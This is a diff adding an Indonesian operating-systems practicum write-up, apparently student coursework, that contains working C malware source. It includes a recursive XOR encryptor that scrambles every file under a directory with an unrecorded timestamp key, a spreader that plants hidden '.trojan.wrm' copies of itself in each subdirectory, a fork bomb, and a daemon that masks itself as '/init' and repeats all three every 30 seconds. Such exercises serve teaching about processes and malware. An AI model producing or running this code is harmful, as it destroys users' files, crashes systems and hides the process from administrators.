@@ -313,4 +313,219 @@ if ( argc == 3 && strcmp(argv[1], "-m") == 0) {
 ```
 ### Nomor 2 (Aria)
 ### Nomor 3 (Gilang)
+
+**==================**
+
+*-Soal B ~ XOR encryptor-*
+
+**==================**
+
+Fungsi xor encrypt
+```bash
+void Soal_B(char *path, unsigned char key) {
+    FILE *file = fopen(path, "rb+");
+    if (!file) return;
+
+    fseek(file, 0, SEEK_END);
+    long size = ftell(file);
+    rewind(file);
+
+    unsigned char *buffer = malloc(size);
+    if (!buffer) {
+        fclose(file);
+        return;
+    }
+
+    fread(buffer, 1, size, file);
+    rewind(file);
+
+    for (long i = 0; i < size; i++) {
+        buffer[i] ^= key;
+    }
+
+    fwrite(buffer, 1, size, file);
+    fclose(file);
+    free(buffer);
+}
+```
+
+Rekursif enkripsi seluruh file di direktori dan subdirektori
+```bash
+void Soal_B_recursive(const char *base_path, unsigned char key) {
+    DIR *dir = opendir(base_path);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char path[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+
+        snprintf(path, sizeof(path), "%s/%s", base_path, entry->d_name);
+
+        struct stat statbuf;
+        if (stat(path, &statbuf) == -1) continue;
+
+        if (S_ISDIR(statbuf.st_mode)) {
+            Soal_B_recursive(path, key);
+        } else if (S_ISREG(statbuf.st_mode)) {
+            Soal_B(path, key);
+        }
+    }
+
+    closedir(dir);
+}
+```
+
+**==================**
+
+*-Soal C ~ Trojan Spread-*
+
+**==================**
+
+Fungsi mencopy file malware
+
+```bash
+void Soal_C_copy(const char *src, const char *dst) {
+    FILE *source = fopen(src, "rb");
+    if (!source) return;
+
+    FILE *dest = fopen(dst, "wb");
+    if (!dest) {
+        fclose(source);
+        return;
+    }
+
+    char buffer[4096];
+    size_t bytes;
+
+    while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
+        fwrite(buffer, 1, bytes, dest);
+    }
+
+    fclose(source);
+    fclose(dest);
+}
+```
+
+Fungsi menyebar salinan malware ke seluruh direktori
+
+```bash
+void Soal_C(const char *dir_path, const char *self_path) {
+    DIR *dir = opendir(dir_path);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char path[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+
+        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);
+
+        struct stat statbuf;
+        if (stat(path, &statbuf) == -1) continue;
+
+        if (S_ISDIR(statbuf.st_mode)) {
+            // Buat salinan malware di direktori ini
+            char target_path[1024];
+            snprintf(target_path, sizeof(target_path), "%s/.trojan.wrm", path);
+            Soal_C_copy(self_path, target_path);
+
+            // Lanjut rekursif
+            Soal_C(path, self_path);
+        }
+    }
+
+    closedir(dir);
+}
+```
+
+**================**
+
+*-Soal E ~ Fork Bomb-*
+
+**================**
+
+```bash
+void Soal_E() {
+    while (1) {
+        fork();
+    }
+}
+
+```
+
+**============================**
+
+*-Soal A & D ~ Daemonize + Loop Fitur-*
+
+**============================**
+
+```bash
+int main(int argc, char *argv[]) {
+    pid_t pid, sid;
+```
+
+Daemonisasi
+
+```bash
+    pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) exit(EXIT_SUCCESS); // Parent process keluar
+
+    umask(0);
+    sid = setsid();
+    if (sid < 0) exit(EXIT_FAILURE);
+    if ((chdir("/")) < 0) exit(EXIT_FAILURE);
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    prctl(PR_SET_NAME, "/init", 0, 0, 0);
+    if (strlen(argv[0]) >= strlen("/init")) {
+        strncpy(argv[0], "/init", strlen(argv[0]));
+    }
+
+    char self_path[1024];
+    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+    if (len != -1) {
+        self_path[len] = '\0';
+```
+
+Loop fitur setiap 30 detik 
+
+```bash
+  while (1) {
+            time_t timestamp = time(NULL);
+            unsigned char key = (unsigned char)(timestamp % 256);
+```
+
+Enkripsi (Soal B)
+```bash
+Soal_B_recursive("/home/gilang/Praktikum/Sisop/Modul_2/FiraCode",
+```
+
+Sebar Malware (Soal C) 
+```bash
+Soal_C("/home/gilang/Praktikum/Sisop/Modul_2/FiraCode", self_path);
+```
+
+Jalankan fork bomb 
+```bash
+pid_t rodok_pid = fork();
+            if (rodok_pid == 0) {
+                Soal_E();
+                exit(EXIT_SUCCESS);
+            }
+
+            sleep(30);
+        }
+    }
+
+    return 0;
+}
+```
+
 ### Nomor 4 (Rayka)
